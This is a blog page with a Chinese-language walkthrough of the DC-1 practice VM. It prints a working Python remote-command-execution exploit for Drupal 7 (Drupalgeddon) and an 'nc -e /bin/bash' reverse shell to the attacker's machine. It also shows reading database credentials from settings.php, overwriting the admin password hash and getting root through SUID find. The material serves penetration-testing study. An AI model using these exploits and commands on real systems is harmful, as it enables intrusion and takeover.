@@ -1,0 +1,353 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC-1靶场练习 | Tree's Blog</title><meta name="author" content="Tree"><meta name="copyright" content="Tree"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC-1靶场练习练习环境kali:192.168.10.128 靶机:未知 两个虚拟机都使用桥接(为了方便) 信息收集先用kali扫描域内存活的主机 nmap 192.168.10.0&#x2F;24   扫描到靶机，获得以下信息：  靶机IP:192.168.10.100  开放端口: 22(ssh),80(http),111(rpcbind)   先从80端口入手,浏览器打开 http:&#x2F;&#x2F;192.16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-1靶场练习">
+<meta property="og:url" content="http://example.com/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Tree&#39;s Blog">
+<meta property="og:description" content="DC-1靶场练习练习环境kali:192.168.10.128 靶机:未知 两个虚拟机都使用桥接(为了方便) 信息收集先用kali扫描域内存活的主机 nmap 192.168.10.0&#x2F;24   扫描到靶机，获得以下信息：  靶机IP:192.168.10.100  开放端口: 22(ssh),80(http),111(rpcbind)   先从80端口入手,浏览器打开 http:&#x2F;&#x2F;192.16">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-6ol7yl_1920x1080.png">
+<meta property="article:published_time" content="2021-12-19T13:16:26.000Z">
+<meta property="article:modified_time" content="2021-12-20T06:04:50.000Z">
+<meta property="article:author" content="Tree">
+<meta property="article:tag" content="DC靶场系列">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-6ol7yl_1920x1080.png"><link rel="shortcut icon" href="/img/favicon.jfif"><link rel="canonical" href="http://example.com/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DC-1靶场练习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-20 14:04:50'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/bg.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jfif" onerror="onerror=null;src='/img/404.png'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-6ol7yl_1920x1080.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Tree's Blog"><span class="site-name">Tree's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">DC-1靶场练习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-19T13:16:26.000Z" title="发表于 2021-12-19 21:16:26">2021-12-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-20T06:04:50.000Z" title="更新于 2021-12-20 14:04:50">2021-12-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="DC-1靶场练习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DC-1靶场练习"><a href="#DC-1靶场练习" class="headerlink" title="DC-1靶场练习"></a>DC-1靶场练习</h1><h2 id="练习环境"><a href="#练习环境" class="headerlink" title="练习环境"></a>练习环境</h2><p>kali:192.168.10.128</p>
+<p>靶机:未知</p>
+<p>两个虚拟机都使用桥接(为了方便)</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用kali扫描域内存活的主机</p>
+<pre><code>nmap 192.168.10.0/24
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161524442.png" alt="image-20211219161524442"></p>
+<p>扫描到靶机，获得以下信息：</p>
+<ul>
+<li><p>靶机IP:192.168.10.100</p>
+</li>
+<li><p>开放端口: 22(ssh),80(http),111(rpcbind)</p>
+</li>
+</ul>
+<p>先从80端口入手,浏览器打开</p>
+<pre><code>http://192.168.10.100
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219161912348.png" alt="image-20211219161912348"></p>
+<p>使用Wappalyzer查看信息</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162152997.png" alt="image-20211219162152997"></p>
+<p>可以看到这个网站的cms是<code>Drupal 7</code></p>
+<p>然后就出于本能的去搜索一下这个版本的CMS的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219162454136.png" alt="image-20211219162454136"></p>
+<p>经过一番查找，得到该漏洞的交互式命令执行python3脚本：</p>
+<pre><code>import requests
+import re
+from sys import argv
+
+domain = argv[1]
+
+
+def exploit(command):
+    HOST=domain
+
+    get_params = &#123;&#39;q&#39;:&#39;user/password&#39;, &#39;name[#post_render][]&#39;:&#39;passthru&#39;, &#39;name[#markup]&#39;:command, &#39;name[#type]&#39;:&#39;markup&#39;&#125;
+    post_params = &#123;&#39;form_id&#39;:&#39;user_pass&#39;, &#39;_triggering_element_name&#39;:&#39;name&#39;&#125;
+    r = requests.post(HOST, data=post_params, params=get_params)
+
+    m = re.search(r&#39;&lt;input type=&quot;hidden&quot; name=&quot;form_build_id&quot; value=&quot;([^&quot;]+)&quot; /&gt;&#39;, r.text)
+    if m:
+        found = m.group(1)
+        get_params = &#123;&#39;q&#39;:&#39;file/ajax/name/#value/&#39; + found&#125;
+        post_params = &#123;&#39;form_build_id&#39;:found&#125;
+        r = requests.post(HOST, data=post_params, params=get_params)
+        print(&quot;\n&quot;.join(r.text.split(&quot;\n&quot;)[:-1]))
+
+
+while True:
+    command = input(&#39;$ &#39;)
+    exploit(command)
+</code></pre>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>先尝试用这个脚本，将代码保存在rce.py中</p>
+<pre><code>python3 rce.py http://192.168.10.100/
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219163714876.png" alt="image-20211219163714876"></p>
+<p>脚本很强，可以使用，直getshell了，但是使用起来不方便</p>
+<p>尝试在msfconsole中查找脚本</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164042118.png" alt="image-20211219164042118"></p>
+<p>找到8个，并且<code>exploit/multi/http/drupal_drupageddon </code>的和http有关，应该是这个了</p>
+<p>设置好配置后尝试攻击</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219164634308.png" alt="image-20211219164634308"></p>
+<p>攻击成功</p>
+<p>尝试获取反弹shell</p>
+<pre><code>kali：nc -lvvp 1234 
+靶机 ：nc -e /bin/bash 192.168.10.128 1234
+kali：python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165140933.png" alt="image-20211219165140933"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165153578.png" alt="image-20211219165153578"></p>
+<p>反弹成功</p>
+<p>先查看文件一下</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165247700.png" alt="image-20211219165247700"></p>
+<p>这里有一个flag1.txt,<code>cat flag1.txt</code>查看</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165548731.png" alt="image-20211219165548731"></p>
+<p>翻译一下：</p>
+<p>“每个好的 CMS 都需要一个配置文件 - 你也是。”</p>
+<p>百度查找一下这个CMS的配置文件名字</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219165833472.png" alt="image-20211219165833472"></p>
+<p>路径都查出来了，直接查看settings.php</p>
+<pre><code>cat sites/default/settings.php
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170147768.png" alt="image-20211219170147768"></p>
+<p>拿到了flag2,并且得到数据库信息</p>
+<p>flag2的翻译：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219170326017.png" alt="image-20211219170326017"></p>
+<p>我不懂作者要表达啥，但我知道要提权</p>
+<p>根据上面信息，尝试连接数据库</p>
+<pre><code>mysql -udbuser -pR0ck3t
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172022853.png" alt="image-20211219172022853"></p>
+<p>连接成功，查看数据库</p>
+<pre><code>show databases;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172120533.png" alt="image-20211219172120533"></p>
+<p>选定数据库drupaldb</p>
+<pre><code>use drupaldb;
+</code></pre>
+<p>查看这个数据库的表</p>
+<pre><code>show tables;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172403487.png" alt="image-20211219172403487"></p>
+<p>查询到敏感表<code>users</code>,查看里面的信息</p>
+<pre><code>select *from users;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219172655690.png" alt="image-20211219172655690"></p>
+<p>可以看到admin的账号密码，密码被hash加密过,这里有两种选择，要么爆破，要么改数据库里的密码</p>
+<p>由flag2提示，爆破这条路似乎走不通，只能修改密码</p>
+<p>首先要找到它的加密脚本丢在哪里，百度一下得知脚本名称为<code>password-hash.sh</code>,然后查找一下</p>
+<pre><code>find / -name password-hash.sh
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219174428472.png" alt="image-20211219174428472"></p>
+<p>得到路径: &#x2F;var&#x2F;www&#x2F;scripts&#x2F;password-hash.sh</p>
+<p>使用drupal 自带脚本重新生成加密后的密码,这里打算把密码改为admin</p>
+<pre><code>./scripts/password-hash.sh admin
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175317713.png" alt="image-20211219175317713"></p>
+<p>得到加密后的密码;</p>
+<pre><code>$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6
+</code></pre>
+<p>回到mysql修改admin密码</p>
+<pre><code>update users set pass=&#39;$S$DDEzmVGyUponhBeWCHBORSLh8X/MX1k0dnHdjF2QG8eq3IDaugr6&#39; where uid=1;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175635384.png" alt="image-20211219175635384"></p>
+<p>密码修改成功</p>
+<p>来到后台尝试登录</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175851595.png" alt="image-20211219175851595"></p>
+<p>登录成功，并且得到flag3</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219175949955.png" alt="image-20211219175949955"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180031924.png" alt="image-20211219180031924"></p>
+<p>翻译一下：</p>
+<p><code>特殊的PERMS 将帮助查找passwd——但您需要-exec 该命令来确定如何获取shadow中的内容。</code></p>
+<p>根据提示，查看&#x2F;etc&#x2F;passwd：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200505179.png" alt="image-20211219200505179"></p>
+<p>这里可以看到有个flag4用户，并且知道flag4路径，还有bash</p>
+<p>查看&#x2F;etc&#x2F;shadow：权限不够</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219200613083.png" alt="image-20211219200613083"></p>
+<p>先查看flag4内容</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219180624886.png" alt="image-20211219180624886"></p>
+<pre><code>Can you use this same method to find or access the flag in root?
+您可以使用相同的方法在 root 中查找或访问flag吗？
+Probably. But perhaps it&#39;s not that easy.  Or maybe it is?
+大概。 但也许没那么容易。 或者也许是？
+</code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>liunx提权一般有四种提权方式：</p>
+<ul>
+<li><p>sudo提权，通过命令<code>sudo -l</code>查看是否有可提权的命令。</p>
+</li>
+<li><p>suid提权，通过命令<code>find / -perm -4000 2&gt;/dev/null</code>查看是否具有root权限的命令，</p>
+</li>
+<li><p>系统版本内核提权。</p>
+</li>
+<li><p>通过数据库提权。</p>
+</li>
+</ul>
+<p>先列出来以root权限执行的文件</p>
+<pre><code>find / -perm -4000 2&gt;/dev/null
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219204647219.png" alt="image-20211219204647219"></p>
+<p>find可以使用</p>
+<p>常见的可以用来提权的文件:</p>
+<pre><code>Nmap
+Vim
+find
+Bash
+More
+Less
+Nano
+cp
+</code></pre>
+<p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了。</p>
+<pre><code>//这个要在/var/www下执行
+touch getflag
+find / -type f -name getflag -exec &quot;whoami&quot; \;
+find / -type f -name getflag -exec &quot;/bin/sh&quot; \;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219210216024.png"></p>
+<p>提权成功，获取root权限</p>
+<p>现在目标就是找最后的flag,最后的flag在root目录下</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211219205951044.png"></p>
+<pre><code>Well done!!!!
+Hopefully you&#39;ve enjoyed this and learned some new skills.
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Tree</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/19/DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">http://example.com/2021/12/19/DC-1靶场练习/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Tree's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">DC靶场系列</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-6ol7yl_1920x1080.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/20/DC-2%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="DC-2靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-48ged1_1920x1080.png" onerror="onerror=null;src='/img/404.png'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DC-2靶场练习</div></div></a></div><div class="next-post pull-right"><a href="/2021/12/16/ssti%E5%AD%A6%E4%B9%A0/" title="ssti学习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-4yy7e7_1920x1080.png" onerror="onerror=null;src='/img/404.png'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ssti学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/12/20/DC-2%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="DC-2靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-48ged1_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-20</div><div class="title">DC-2靶场练习</div></div></a></div><div><a href="/2021/12/21/DC-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="DC-4靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-kwm2r6_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-21</div><div class="title">DC-4靶场练习</div></div></a></div><div><a href="/2021/12/24/DC-6%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="DC-6靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-mpx5m8_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-24</div><div class="title">DC-6靶场练习</div></div></a></div><div><a href="/2021/12/31/DC-7%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" title="DC-7靶场练习"><img class="cover" src="https://raw.githubusercontent.com/todis21/image/main/img/wallhaven-wy5176_1920x1080.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-31</div><div class="title">DC-7靶场练习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jfif" onerror="this.onerror=null;this.src='/img/404.png'" alt="avatar"/></div><div class="author-info__name">Tree</div><div class="author-info__description">随便都行都可以</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/todis21"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/todis21" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3440848736@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">DC-1靶场练习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0%E7%8E%AF%E5%A2%83"><span class="toc-number">1.1.</span> <span class="toc-text">练习环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马"><img src="https://su18.org/post-images/memory-shell.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Java内存马"/></a><div class="content"><a class="title" href="/2023/04/18/Java%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马">Java内存马</a><time datetime="2023-04-18T12:22:14.000Z" title="发表于 2023-04-18 20:22:14">2023-04-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞"><img src="https://raw.githubusercontent.com/todis21/image/main/202304161714754.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Shiro反序列化漏洞"/></a><div class="content"><a class="title" href="/2023/04/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a><time datetime="2023-04-11T05:03:59.000Z" title="发表于 2023-04-11 13:03:59">2023-04-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析"><img src="https://raw.githubusercontent.com/todis21/image/main/202304092013733.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="Fastjson漏洞分析"/></a><div class="content"><a class="title" href="/2023/04/08/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Fastjson漏洞分析">Fastjson漏洞分析</a><time datetime="2023-04-08T07:19:37.000Z" title="发表于 2023-04-08 15:19:37">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6"><img src="https://raw.githubusercontent.com/todis21/image/main/202304062210726.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonsCollections6"/></a><div class="content"><a class="title" href="/2023/04/06/CommonsCollections6/" title="CommonsCollections6">CommonsCollections6</a><time datetime="2023-04-06T06:19:07.000Z" title="发表于 2023-04-06 14:19:07">2023-04-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/04/CommonCollections1/" title="CommonCollections1"><img src="https://raw.githubusercontent.com/todis21/image/main/202304051554165.png" onerror="this.onerror=null;this.src='/img/404.png'" alt="CommonCollections1"/></a><div class="content"><a class="title" href="/2023/04/04/CommonCollections1/" title="CommonCollections1">CommonCollections1</a><time datetime="2023-04-04T07:10:57.000Z" title="发表于 2023-04-04 15:10:57">2023-04-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tree</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas 